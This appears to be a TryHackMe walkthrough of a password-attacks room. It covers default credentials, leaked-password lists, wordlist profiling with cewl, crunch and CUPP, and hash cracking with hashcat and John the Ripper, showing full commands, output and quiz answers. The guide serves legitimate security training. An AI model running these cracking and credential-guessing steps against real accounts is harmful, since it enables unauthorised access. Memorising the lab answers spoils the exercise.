
Task 1 - Introduction
------------------------------------

In this room we discuss techniques used in password attacks. We'll also cover how to get and generate password lists. Here are some topics:

-   Password profiling
-   Password attacks techniques
-   Online password attacks

### What is a password?

Passwords are used as an authentication method for individuals to access systems or services. Typically only the owner would know the password. This would ensure they are the only ones who can access the service. However, as we have seen many times, passwords and password lists can fall into the wrong hands and unauthorized events/changes may happen. This type of unauthorized access could also lead to loss of private information, theft, severe damage to systems, etc. Passwords can be compromised of letters (both upper and lower case), numbers, and special characters. Those are typically defined by the password policy set by the system administrator.

In the Red team world, a collection of passwords is often referred to as a dictionary or wordlist. Passwords that have a low complexity like:

* password
* 123456
* 11111111
* god
* etc

are easily cracked within seconds. Here are the [top 100 and most common and seen passwords](https://techlabuzz.com/top-100-most-common-passwords/) for your reference. Therefore, it is wise to choose a strong password, and it should be checked again password lists/dictionaries to ensure it doesn't exist. Passwords should contain:

* at LEAST 8 characters, prefereably 12 or more
* Upper case letters
* Lower case letters
* Numbers
* and Special Symbols such as \*&^%$#@

Most companies use a password policy that forces users to create a strong password. It will dictate how many letters, numbers, upper/lowercase and special characters must be used. However, if the attacks figures out the password policy, he could generate a list that satisfies the policy.

### How secure are passwords?

It really depends how they are stored.  Storing passwords in plaintext format is a very bad idea. So is obfuscating methods like using base64 to encode a plaintext password.  Passwords that are encrypted/hashed are the best, but even they can be cracked if an adversary gets access to the system and is able to download them. 

__Questions__

Learn about password attacking techniques in the next task!
Answer: _None Needed_


Task 2 - Password Attacking Techniques
------------------------------------------------------------------

### Password Attack Techniques

Here we will cover some techniques that could be used to perform password attacks:

* dictionary
* brute-force
* rule-based
* guessing

All of these are considered an 'online' attack and must be performed when connected to the target to obtain the password and gain unauthorized access.

### Password Cracking vs. Password Guessing

Password cracking is a technique used to discover passwords from encrypted/hashed data.

Password guessing is a method of guessing passwords based on dictionaries.

Here are some differences between the two:

-   Password guessing is a technique used to target online protocols and services. Therefore, it's considered time-consuming and opens up the opportunity to generate logs for the failed login attempts. A password guessing attack conducted on a web-based system often requires a new request to be sent for each attempt, which can be easily detected. It may cause an account to be locked out if the system is designed and configured securely.
-   Password cracking is a technique performed locally or on systems controlled by the attacker.

__Questions__

Which type of password attack is performed locally?
Answer: _Password Cracking_


Task3 - Password Profiling #1
---------------------------------------------------------
Default, Weak, Leaked, Combined, and Username Wordlists

Having good wordlists is critical to a successful attack. Sometimes, especially if time is of the essence, doing proper recon and knowing how to build wordlists is very important. 

### Default Passwords

Before performing password attacks, it is always worth trying a couple of default passwords. Manufacturers set a default password and put these in the online documentation. Many times systems administrators never change these. Here are some defaults to try:

* admin:admin
* root:root
* root:toor
* admin:123456
* etc

If we know the target, we can look up what the vendor may have set for default password and use that. For example if the target is a Tomcat webserver we could try:

* admin:admin
* tomcat:admin

Here are some website lists that provide default passwords for various products.

-   [](https://cirt.net/passwords)[https://cirt.net/passwords](https://cirt.net/passwords)
-   [](https://default-password.info/)[https://default-password.info/](https://default-password.info/)
-   [](https://datarecovery.com/rd/default-passwords/)[https://datarecovery.com/rd/default-passwords/](https://datarecovery.com/rd/default-passwords/)

### Weak Passwords

Weak passwords that are collected by professionals over time, are put into large wordlists. Here are some common weak password lists:

-   [https://wiki.skullsecurity.org/index.php?title=Passwords](https://wiki.skullsecurity.org/index.php?title=Passwords)[](https://wiki.skullsecurity.org/index.php?title=Passwords) - This includes the most well-known collections of passwords.
-   [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Passwords) - A huge collection of all kinds of lists, not only for password cracking.

### Leaked Passwords

Sensitive data like passwords or hashes maybe publically disclosed or sold after a breach. These leaks are referred to as 'dumps'.  These dumps may contain hashes of passwords which would require cracking. The following are some of the common password lists that have weak and leaked passwords, including webhost, elitehacker,hak5, Hotmail, PhpBB companies' leaks:  

-   [SecLists/Passwords/Leaked-Databases](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases)

### Combined wordlists

If we want to combine wordlists in Linux, we can do this with the `cat` command like this:

```bash
cat file1.txt file2.txt file3.txt > combined_list.txt
```

Afterwards we can clean up the wordlist and remove the duplicates like this:

```bash
sort combined_list.txt | uniq -u > cleaned_combined_list.txt
```

### Customized wordlists

Using a customized list is one of the best ways to increase our chances of finding valid credentials. Often, company websites show valuable data, such as it's employees, email addresses, etc. It may also contain company products and services which might be used in an employees password.

Tools like **Cewl** can be used to crawl a website and extract strings/keywords. This is a powerful tool to help generate wordlists specific to a company:

```bash
user@thm$ cewl -w list.txt -d 5 -m 5 http://thm.labs
```

-w will write the contents to a file. In this case, list.txt.

-m 5 gathers strings (words) that are 5 characters or more

-d 5 is the depth level of web crawling/spidering (default 2)

http://thm.labs is the URL that will be used

Apply what we discuss using cewl against https://clinic.thmredteam.com/ to parse all words and generate a wordlist with a minimum length of 8. Note that we will be using this wordlist later on with another task!

### Username wordlists

Gathering employee names during enumeration is essential.  We can generate username lists from a target's website. In the following we will assume we have {first name}{last name} (ex: John Smith) and a method for generating these.

-   **{first name}:** john
-   **{last name}:** smith
-   **{first name}{last name}:  johnsmith** 
-   **{last name}{first name}:  smithjohn**  
-   first letter of the **{first name}{last name}: jsmith** 
-   first letter of the **{last name}{first name}: sjohn**  
-   first letter of the **{first name}.{last name}: j.smith** 
-   first letter of the **{first name}-{last name}: j-smith** 
-   and so on

Thankfully, there is a tool username_generator that could help create a list with most of the possible combinations if we have a first name and last name.

```bash
user@thm$ git clone https://github.com/therodri2/username_generator.git
Cloning into 'username_generator'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (7/7), done.
remote: Total 9 (delta 0), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (9/9), done.

user@thm$ cd username_generator
```

Using python3 username_generator.py -h shows the tool's help message and optional arguments.

```bash
user@thm$ python3 username_generator.py -h
usage: username_generator.py [-h] -w wordlist [-u]

Python script to generate user lists for bruteforcing!

optional arguments:
  -h, --help            show this help message and exit
  -w wordlist, --wordlist wordlist
                        Specify path to the wordlist
  -u, --uppercase       Also produce uppercase permutations. Disabled by default
```

Now let's create a wordlist that contains the full name John Smith to a text file. Then, we'll run the tool to generate the possible combinations of the given full name.

```bash
user@thm$ echo "John Smith" > users.lst
user@thm$ python3 username_generator.py -w users.lst
usage: username_generator.py [-h] -w wordlist [-u]
john
smith
j.smith
j-smith
j_smith
j+smith
jsmith
smithjohn
```

These are just some examples. Feel free to find others.

__Questions__

What is the Juniper Networks ISG 2000 default password?
Answer: _netscreen:netscreen_


Task 4 - Password Profiling #2
----------------------------------------------------
Keyspace Technique and CUPP

### Keyspace Technique

In this technique we specify a range of characters, numbers and symbols in our wordlist. `crunch` is one of the many powerful tools for creating an offline wordlist.  We can also specify numerous options:

```bash
 kali@kali  ~  crunch -h                                                    
crunch version 3.6

Crunch can create a wordlist based on criteria you specify.  The output from crunch can be sent to the screen, file, or to another program.

Usage: crunch <min> <max> [options]
where min and max are numbers

Please refer to the man page for instructions and examples on how to use crunch.
```

The following example creates a wordlist containing all possible combinations of 2 characters, including 0-4 and a-d. We can use the -o argument and specify a file to save the output to.

```bash
 kali@kali  ~  crunch 2 2 01234abcd -o crunch.txt
Crunch will now generate the following amount of data: 243 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 81 

crunch: 100% completed generating output
```

Here is a snippet of the output:

```bash
 kali@kali  ~  cat crunch.txt                    
00
01
02
03
04
0a
0b
0c
0d
10
[..]
d0
d1
d2
d3
d4
da
db
dc
dd
```

You can generate very large files as well depending on the options/requirements you give it.

For example:

```bash
 kali@kali  ~  crunch 8 8 0123456789abcdefABCDEF -o crunch.txt
```

Will generate  a filesize of 459 GB and will contain 54875873536 words.

`crunch` also has a handy `-t` option so we can combine words. Here are some options:

@ - lower case alpha characters

, - upper case alpha characters

% - numeric characters

^ - special characters including space

For example, if part of the password is known to us, and we know it starts with pass and follows two numbers, we can use the % symbol from above to match the numbers. Here we generate a wordlist that contains pass followed by 2 numbers:

```bash
 kali@kali  ~   crunch 6 6 -t pass%%
Crunch will now generate the following amount of data: 700 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 100
pass00
pass01
pass02
pass03
```


### CUPP - Common User Passwords Profiler

CUPP is an automatic and interactive tool written in Python that allows for creating custom wordlists. If you know some details about the target like birthdays, pet names, company, etc. this could help target their legitimate password.

CUPP will take the information you provide and generate a password list on that with various changes. It also supports `1337/leet` mode for replaces letters like  a, i,e, t, o, s, g, z  with numbers. For example, replace a  with 4  or i with 1. For more information about the tool, please visit the GitHub repo [here](https://github.com/Mebus/cupp).

```bash
 kali@kali  ~  git clone https://github.com/Mebus/cupp.git
Cloning into 'cupp'...
remote: Enumerating objects: 237, done.
Receiving objects: 100% (237/237), 2.14 MiB | 15.24 MiB/s, done.
remote: Total 237 (delta 0), reused 0 (delta 0), pack-reused 237
Resolving deltas: 100% (125/125), done.
```

After changing into the directory we cloned, we can run it to show options:

```bash
kali@kali  ~/cupp   master  python3 cupp.py          
 ___________ 
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]

usage: cupp.py [-h] [-i | -w FILENAME | -l | -a | -v] [-q]

Common User Passwords Profiler

options:
  -h, --help         show this help message and exit
  -i, --interactive  Interactive questions for user password profiling
  -w FILENAME        Use this option to improve existing dictionary, or WyD.pl output to make
                     some pwnsauce
  -l                 Download huge wordlists from repository
  -a                 Parse default usernames and passwords directly from Alecto DB. Project
                     Alecto uses purified databases of Phenoelit and CIRT which were merged
                     and enhanced
  -v, --version      Show the version of this program.
  -q, --quiet        Quiet mode (don't print banner)
```

CUPP supports an interactive mode usnig `-i` option.

```bash
user@thm$  python3 cupp.py -i
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: 
> Surname: 
> Nickname: 
> Birthdate (DDMMYYYY): 


> Partners) name:
> Partners) nickname:
> Partners) birthdate (DDMMYYYY):


> Child's name:
> Child's nickname:
> Child's birthdate (DDMMYYYY):


> Pet's name:
> Company name:


> Do you want to add some key words about the victim? Y/[N]:
> Do you want to add special chars at the end of words? Y/[N]:
> Do you want to add some random numbers at the end of words? Y/[N]:
> Leet mode? (i.e. leet = 1337) Y/[N]:

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to .....txt, counting ..... words.
> Hyperspeed Print? (Y/n)
```

ِAs a result, a custom wordlist that contains various numbers of words based on your entries is generated. Pre-created wordlists can be downloaded to your machine as follows:

CUPP

```bash
kali@kali  ~/cupp   master   python3 cupp.py -l
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


        Choose the section you want to download:

     1   Moby            14      french          27      places
     2   afrikaans       15      german          28      polish
     3   american        16      hindi           29      random
     4   aussie          17      hungarian       30      religion
     5   chinese         18      italian         31      russian
     6   computer        19      japanese        32      science
     7   croatian        20      latin           33      spanish
     8   czech           21      literature      34      swahili
     9   danish          22      movieTV         35      swedish
    10   databases       23      music           36      turkish
    11   dictionaries    24      names           37      yiddish
    12   dutch           25      net             38      exit program
    13   finnish         26      norwegian


        Files will be downloaded from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/ repository

        Tip: After downloading wordlist, you can improve it with -w option

> Enter number:
```

Based on your interest, you can choose the wordlist from the list above to aid in generating wordlists for brute-forcing!

Finally, CUPP could also provide default usernames and passwords from the Alecto database by using the -a option. 

CUPP

```bash
kali@kali  ~/cupp   master   python3 cupp.py -a
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Checking if alectodb is not present...
[+] Downloading alectodb.csv.gz from https://github.com/yangbh/Hammer/raw/b0446396e8d67a7d4e53d6666026e078262e5bab/lib/cupp/alectodb.csv.gz ...

[+] Exporting to alectodb-usernames.txt and alectodb-passwords.txt
[+] Done.
```


__Questions__
  
Run the following crunch command:crunch 2 2 01234abcd -o crunch.txt. How many words did crunch generate?
Note: We ran this command 1st. If we look closely at the output it says 81 lines written to file.
Answer: _81_

What is the crunch command to generate a list containing THM@! and output to a file named tryhackme.txt?
Answer:  _crunch 5 5 -t THM^^ -o tryhackme.txt_

NOTE: This one is a bit tricky. First instinct is to just use the entire string `THM@!` but it just needs a word, and if you read the output carefully it says 'create a list containing...' so we use the special double carat modifier to generate all options using special characters after the word `THM..`


Task 5 - Offline Attacks
------------------------------------------
Dictionary and Brute-Force

### Dictionary attack

This attack uses a list of words from a text file that contain well-known words or phrases. We can use this word list with various tools to make password guessing faster and easier. In this section we will use `hashcat` which is a popular hash cracking tool.

Let's say we have obtained a hash `f806fc5a2a0d5ba2471600758452799c`. In order to crack it we need to know:

* What type of hash it is
* What wordlist or attack mode we can use

There are some tools we can use to id the hash such as:

* hashid
* hash-identifier
* Online tools such as crackstation

For this example, hash-identifier believed the possible hashing method is MD5. Please note the time to crack a hash will depend on the hardware you're using (CPU and/or GPU).

```bash
 kali@kali  ~  hashcat -a 0 -m 0 --force f806fc5a2a0d5ba2471600758452799c /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-1165G7 @ 2.80GHz, 2918/5900 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

f806fc5a2a0d5ba2471600758452799c:rockyou                  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: f806fc5a2a0d5ba2471600758452799c
Time.Started.....: Wed Jan 25 09:59:03 2023, (0 secs)
Time.Estimated...: Wed Jan 25 09:59:03 2023, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    17341 H/s (0.10ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1024/14344385 (0.01%)
Rejected.........: 0/1024 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> bethany
Hardware.Mon.#1..: Util: 21%

Started: Wed Jan 25 09:59:03 2023
Stopped: Wed Jan 25 09:59:05 2023
```

-a 0  sets the attack mode to a dictionary attack

-m 0  sets the hash mode for cracking MD5 hashes; for other types, run hashcat -h for a list of supported hashes.

f806fc5a2a0d5ba2471600758452799c this option could be a single hash like our example or a file that contains a hash or multiple hashes.

/usr/share/wordlists/rockyou.txt the wordlist/dictionary file for our attack

We run hashcat with --show option to show the cracked value if the hash has been cracked:
```bash
 kali@kali  ~  hashcat -a 0 -m 0 F806FC5A2A0D5BA2471600758452799C /usr/share/wordlists/rockyou.txt --show
f806fc5a2a0d5ba2471600758452799c:rockyou
```

The output of this is in the original hashcat command, but using this its clear to see the password for the cracked hash is `rockyou`

### Brute-Force attack

Brute-force is another method of guessing the password. This method uses a method of sending standard password combinations. The difference between this method and a dictionary based attack is that the dictionary attack uses a wordlist.

The brute-force method will try all combinations of a character or characters. In the case where you know a bank account #, but need a 4 digit pin to login, you could brute-force all numbers from 0000 to 9999.  In another case you may add a sequence of numbers or letters to a partially known password such as `admin0`, `admin1`, ... `admin9999` 

`hashcat` has a charset option that could be used to generate your own combinations:

```bash
 kali@kali  ~  hashcat --help
 ? | Charset
 ===+=========
  l | abcdefghijklmnopqrstuvwxyz
  u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
  d | 0123456789
  h | 0123456789abcdef
  H | 0123456789ABCDEF
  s |  !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
  a | ?l?u?d?s
  b | 0x00 - 0xff
```

The following example shows how we can use hashcat with the brute-force attack mode with a combination of our choice.

```bash
 kali@kali  ~  hashcat -a 3 ?d?d?d?d --stdout 1234 0234 2234 3234 9234 4234 5234 8234 7234 6234 .. ..
```

NOTE: If you are using ZSH for your shell, you might get something like this:
```bash
 kali@kali  ~  hashcat -a 3 ?d?d?d?d --stdout
zsh: no matches found: ?d?d?d?d
```
If that's the case just type `bash` to get into bash before running your command, and afterwards you can go back to zsh by typing `exit`

-a 3  sets the attacking mode as a brute-force attack

?d?d?d?d the ?d tells hashcat to use a digit. In our case, ?d?d?d?d for four digits starting with 0000 and ending at 9999

--stdout print the result to the terminal

Now let's apply the same concept to crack the following MD5 hash: 05A5CF06982BA7892ED2A6D38FE832D6 a four-digit PIN number.

```bash
┌──(kali㉿kali)-[~]
└─$ hashcat -a 3 -m 0 05A5CF06982BA7892ED2A6D38FE832D6 ?d?d?d?d
05a5cf06982ba7892ed2a6d38fe832d6:2021

Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: 05a5cf06982ba7892ed2a6d38fe832d6
Time.Started.....: Mon Oct 11 10:54:06 2021 (0 secs)
Time.Estimated...: Mon Oct 11 10:54:06 2021 (0 secs)
Guess.Mask.......: ?d?d?d?d [4]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 16253.6 kH/s (0.10ms) @ Accel:1024 Loops:10 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10000/10000 (100.00%)
Rejected.........: 0/10000 (0.00%)
Restore.Point....: 0/1000 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-10 Iteration:0-10
Candidates.#1....: 1234 -> 6764

Started: Mon Oct 11 10:54:05 2021
Stopped: Mon Oct 11 10:54:08 2021

┌──(kali㉿kali)-[~]
└─$ hashcat -a 3 -m 0 05A5CF06982BA7892ED2A6D38FE832D6 ?d?d?d?d --show
05a5cf06982ba7892ed2a6d38fe832d6:2021
```

__Questions__

Considering the following hash: 8d6e34f987851aa599257d3831a1af040886842f. What is the hash type?

```bash
 kali@kali  ~  hash-identifier  hash-identifier                                                                             
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 8d6e34f987851aa599257d3831a1af040886842f

Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))

[..]
```
Answer: _SHA-1_

Perform a dictionary attack against the following hash: 8d6e34f987851aa599257d3831a1af040886842f. What is the cracked value? Use rockyou.txt wordlist.
```bash
kali@kali  ~  hashcat -a 0 -m 100 --force 8d6e34f987851aa599257d3831a1af040886842f /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-1165G7 @ 2.80GHz, 2918/5900 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

8d6e34f987851aa599257d3831a1af040886842f:sunshine         
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 100 (SHA1)
Hash.Target......: 8d6e34f987851aa599257d3831a1af040886842f
Time.Started.....: Wed Jan 25 10:36:13 2023, (0 secs)
Time.Estimated...: Wed Jan 25 10:36:13 2023, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   395.0 kH/s (0.25ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1024/14344385 (0.01%)
Rejected.........: 0/1024 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> bethany
Hardware.Mon.#1..: Util: 11%

Started: Wed Jan 25 10:36:02 2023
Stopped: Wed Jan 25 10:36:14 2023

```

Answer: _sunshine_

  
Perform a brute-force attack against the following MD5 hash: e48e13207341b6bffb7fb1622282247b. What is the cracked value? Note the password is a 4 digit number: [0-9][0-9][0-9][0-9]

```bash
┌──(kali㉿kali)-[~]
└─$ hashcat -a 3 -m 0 e48e13207341b6bffb7fb1622282247b ?d?d?d?d 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-1165G7 @ 2.80GHz, 2918/5900 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Brute-Force
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

e48e13207341b6bffb7fb1622282247b:1337                     
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: e48e13207341b6bffb7fb1622282247b
Time.Started.....: Wed Jan 25 10:37:45 2023 (0 secs)
Time.Estimated...: Wed Jan 25 10:37:45 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: ?d?d?d?d [4]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 16754.7 kH/s (0.41ms) @ Accel:512 Loops:10 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10000/10000 (100.00%)
Rejected.........: 0/10000 (0.00%)
Restore.Point....: 0/1000 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-10 Iteration:0-10
Candidate.Engine.: Device Generator
Candidates.#1....: 1234 -> 6764
Hardware.Mon.#1..: Util: 23%

Started: Wed Jan 25 10:37:44 2023
Stopped: Wed Jan 25 10:37:46 2023

┌──(kali㉿kali)-[~]
└─$ hashcat -a 3 -m 0 e48e13207341b6bffb7fb1622282247b ?d?d?d?d --show                          
e48e13207341b6bffb7fb1622282247b:1337
```
Answer: _1337_



Task 6 - Offline Attacks
----------------------------------------
Rule-Based

### Rule-Based attacks

Rule-based attacks are also known as Hybrid attacks.  This type of attack assumes the attacker understands the password rules for the target so that the passwork list created only generates valid passwords, thereby increasing speed and accuracy of the attack.

One such example is using transforms/mangles on a password named `password`:

* password
* p@ssw0rd
* Pa\$$word
* etc

For the next attack we can use something like hashcat or John the Ripper. This time we will use the later. We need to first change the ruleset by editing the config file under `/etc/john/john.conf`.  

You can read  `/etc/john/john.conf` and look for List.Rules to see all the available rules:

```bash
 kali@kali  ~  cat /etc/john/john.conf|grep "List.Rules:" | cut -d"." -f3 | cut -d":" -f2 | cut -d"]" -f1 | awk NF
JumboSingle
o1
o2
i1
i2
o1
i1
o2
i2
best64
d3ad0ne
dive
InsidePro
T0XlC
rockyou-30000
specific
ShiftToggle
Split
Single
Extra
OldOffice
Single-Extra
Wordlist
ShiftToggle
Multiword
best64
UnicodeSubstitution
Jumbo
KoreLogic
T9
hashcat
```

We can see that we have many rules that are available for us to use. We will create a wordlist with only one password containing the string tryhackme, to see how we can expand the wordlist. Let's choose one of the rules, the best64 rule, which contains the best 64 built-in John rules, and see what it can do!

```bash
 kali@kali  ~  echo tryhackme > /tmp/single-password-list.txt               
 kali@kali  ~  cat /tmp/single-password-list.txt 
tryhackme
 kali@kali  ~  john --wordlist=/tmp/single-password-list.txt --rules=best64 --stdout | wc -l
Using default input encoding: UTF-8
Press 'q' or Ctrl-C to abort, almost any other key for status
75p 0:00:00:00 100.00% (2023-01-26 08:59) 1875p/s tckmet
75
```


--wordlist= to specify the wordlist or dictionary file. 

--rules to specify which rule or rules to use.

--stdout to print the output to the terminal.

|wc -l  to count how many lines John produced.

Using that command, we actually expanded our wordlist from 1 to 76 passwords!

In the next example, we will check out another rule from John called `KoreLogic`. This one uses some custom logic to generate complex password lists. For more information, please visit this website [here](https://contest-2010.korelogic.com/rules.html). Now let's use this rule and check whether the Tryh@ckm3 is available in our list!

```bash
kali@kali  ~  john --wordlist=/tmp/single-password-list.txt --rules=KoreLogic --stdout |grep "Tryh@ckm3"
Using default input encoding: UTF-8
Press 'q' or Ctrl-C to abort, almost any other key for status
Tryh@ckm3
Tryh@ckm3
```

So pretty cool. We were able to take a plain password and make a complex version of it. It is recommended to go through the other rules on the site and check out even more combinations.

### Custom Rules

JTR has a lot to offer. We can even use it to build our own rules at runtime while John is cracking the hash or use a rule to create a custom wordlist.

Let's say we wanted to create a custom wordlist from a pre-existing dictionary with custom modification to the original dictionary. The goal is to add special characters (ex: !@#$*&) to the beginning of each word and add numbers 0-9 at the end. The format will be as follows:

[symbols]word[0-9]

We can add our rule to the **end** of john.conf:

```bash
 kali@kali  ~  sudo vi /etc/john/john.conf
[sudo] password for kali: 
[List.Rules:THM-Password-Attacks]
Az"[0-9]" ^[!@#$]
```

[List.Rules:THM-Password-Attacks]  specify the rule name THM-Password-Attacks.

Az represents a single word from the original wordlist/dictionary using -p.

"[0-9]" append a single digit (from 0 to 9) to the end of the word. For two digits, we can add "[0-9][0-9]"  and so on.  

^[!@#$] add a special character at the beginning of each word. ^ means the beginning of the line/word. Note, changing ^ to $ will append the special characters to the end of the line/word.

Now let's create a file containing a single word password to see how we can expand our wordlist using this rule. Then we will run john again using our new rules list and direct the output to stdout:

```bash
 kali@kali  ~  echo password > /tmp/single.lst               
 kali@kali  ~  cat /tmp/single.lst              
password
 kali@kali  ~  john --wordlist=/tmp/single.lst --rules=THM-Password-Attacks --stdout
Using default input encoding: UTF-8
!password0
@password0
#password0
$password0
!password1
@password1
#password1
$password1
!password2
@password2
#password2
$password2
!password3
@password3
#password3
$password3
!password4
@password4
#password4
$password4
!password5
@password5
#password5
$password5
!password6
@password6
#password6
$password6
!password7
@password7
#password7
$password7
!password8
@password8
#password8
$password8
!password9
@password9
#password9
$password9
```

__Questions__

